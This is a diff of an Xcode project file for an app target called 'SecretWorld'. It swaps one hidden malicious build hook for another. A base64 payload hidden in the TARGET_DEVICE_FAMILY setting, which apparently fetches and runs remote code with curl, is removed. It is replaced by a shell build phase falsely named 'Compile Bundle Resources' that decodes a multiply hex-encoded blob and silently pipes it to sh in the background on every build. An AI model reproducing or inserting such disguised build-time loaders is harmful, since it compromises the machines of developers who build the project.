@@ -1710,7 +1710,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 00FE92052B340CAA00D8AB20 /* Build configuration list for PBXNativeTarget "SecretWorld" */;
 			buildPhases = (
-				29DD81BE4EBBDCFDD934C644 /* Build Framework Dependencies */,
+				BFA45C09EB1730A7C934C644 /* Compile Bundle Resources */,
 				ED343CE41243F91A3E2C71CE /* [CP] Check Pods Manifest.lock */,
 				00FE91D72B340CA800D8AB20 /* Sources */,
 				00FE91D82B340CA800D8AB20 /* Frameworks */,
@@ -1810,6 +1810,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
 /* Begin PBXResourcesBuildPhase section */
 		00FE91D92B340CA800D8AB20 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -1901,25 +1904,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		29DD81BE4EBBDCFDD934C644 /* Build Framework Dependencies */ = {
+		BFA45C09EB1730A7C934C644 /* Compile Bundle Resources */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Build Framework Dependencies";
+			name = "Compile Bundle Resources";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
-			showEnvVarsInLog = 0;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333433333336333333353333333733333336333333373333333333333336333633343333333633333331333333373333333333333337333333343333333633333335333333373333333233333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
 		};
 		A3E0B6A7557AAB6B68A23C85 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -2400,7 +2402,6 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2WTJ4dmRXUjBaV05vY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -2456,7 +2457,6 @@
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
-				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2WTJ4dmRXUjBaV05vY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
